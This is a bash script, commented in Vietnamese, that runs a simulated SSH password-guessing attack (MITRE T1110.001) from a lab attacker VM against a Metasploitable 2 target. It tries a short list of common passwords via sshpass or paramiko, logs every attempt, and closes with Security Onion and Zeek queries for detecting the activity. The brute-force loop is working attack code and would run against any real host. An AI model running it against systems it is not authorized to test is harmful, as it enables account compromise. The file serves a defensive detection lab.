#!/usr/bin/env bash
# ==============================================================================
# Script: auth_attack_simulation.sh
# Purpose: Simulate SSH Password Guessing / Brute Force (T1110.001) for Scenario 2
# Platform: VMware Lab (Linux Attacker -> Metasploitable 2 Target)
# ==============================================================================

# Màu sắc hiển thị
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Kiểm tra tham số help
if [[ "$1" == "-h" || "$1" == "--help" ]]; then
    echo -e "${CYAN}Huong dan su dung:${NC}"
    echo "  $0 [TARGET_IP] [TARGET_USER]"
    echo ""
    echo "Vi du:"
    echo "  $0 192.168.100.188 labuser"
    exit 0
fi

TARGET_IP="${1:-192.168.100.188}"
TARGET_USER="${2:-labuser}"
OUTPUT_FILE="scenario2-auth-attack.log"

PASSWORDS=(
    "123456"
    "password"
    "admin123"
    "toor2024"
    "letmein"
    "wrongpass1"
)

echo -e "${CYAN}==========================================================${NC}"
echo -e "${YELLOW} [!] BAT DAU MO PHONG TAN CONG DANG NHAP (SSH BRUTE FORCE)${NC}"
echo -e " Target IP : ${GREEN}$TARGET_IP${NC} (Port 22)"
echo -e " Username  : ${GREEN}$TARGET_USER${NC}"
echo -e " Platform  : VMware Lab Network"
echo -e " Thoi gian : $(date -Is)"
echo -e "${CYAN}==========================================================${NC}"

# Kiểm tra công cụ trước khi chạy
if ! command -v sshpass >/dev/null 2>&1 && ! python3 -c "import paramiko" >/dev/null 2>&1; then
    echo -e "${YELLOW}[!] Luu y: Chua cai dat 'sshpass'. Khuyen nghi cai dat de chay muot nhat:${NC}"
    echo "    sudo apt update && sudo apt install -y sshpass"
    echo ""
fi

echo "Timestamp: $(date -Is)" > "$OUTPUT_FILE"
echo "Target: $TARGET_IP | User: $TARGET_USER" >> "$OUTPUT_FILE"
echo "----------------------------------------------------------" >> "$OUTPUT_FILE"

count=1
for pass in "${PASSWORDS[@]}"; do
    echo -ne "[$count/${#PASSWORDS[@]}] Thu mat khau: '${YELLOW}$pass${NC}' ... "
    
    # 1. Thu bang sshpass
    if command -v sshpass >/dev/null 2>&1; then
        res=$(sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
                                    -o UserKnownHostsFile=/dev/null \
                                    -o ConnectTimeout=3 \
                                    -o NumberOfPasswordPrompts=1 \
                                    "$TARGET_USER@$TARGET_IP" 2>&1)
    # 2. Fallback sang Python Paramiko neu khong co sshpass
    elif python3 -c "import paramiko" >/dev/null 2>&1; then
        res=$(python3 -c "
import paramiko, socket
try:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect('$TARGET_IP', port=22, username='$TARGET_USER', password='$pass', timeout=3)
    print('SUCCESS')
    client.close()
except paramiko.AuthenticationException:
    print('Permission denied (password authentication failed)')
except Exception as e:
    print(f'Error: {e}')
" 2>&1)
    # 3. Fallback sang netcat/curl/ssh co timeout
    else
        res=$(timeout 3 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 "$TARGET_USER@$TARGET_IP" 2>&1)
    fi

    # Danh gia ket qua
    if [[ "$res" == *"SUCCESS"* ]]; then
        echo -e "${GREEN}[DANG NHAP THANH CONG]${NC}"
    else
        echo -e "${RED}[THAT BAI - Permission Denied]${NC}"
    fi

    echo "[$(date -Is)] Attempt $count: User='$TARGET_USER' Pass='$pass' Result='$res'" >> "$OUTPUT_FILE"
    
    count=$((count + 1))
    sleep 1
done

echo -e "${CYAN}==========================================================${NC}"
echo -e "${GREEN} [✓] Hoan tat mo phong. Log duoc luu tai: ${YELLOW}$OUTPUT_FILE${NC}"
echo -e "${CYAN}----------------------------------------------------------${NC}"
echo -e "${YELLOW} HUONG DAN DIEU TRA TIEP THEO TREN SECURITY ONION SOC:${NC}"
echo -e " 1. Truy cap giao dien SOC -> Mục ${BLUE}Hunt${NC}"
echo -e " 2. Network Query (Zeek):"
echo -e "    ${CYAN}event.dataset:\"zeek.conn\" AND destination.port:22 AND destination.ip:\"$TARGET_IP\"${NC}"
echo -e " 3. Kiem tra SSH Metadata:"
echo -e "    ${CYAN}event.dataset:\"zeek.ssh\" AND destination.ip:\"$TARGET_IP\"${NC}"
echo -e " 4. Kiem tra Auth Log tren Metasploitable 2:"
echo -e "    ${CYAN}sudo cat /var/log/auth.log | grep sshd${NC}"
echo -e "${CYAN}==========================================================${NC}"
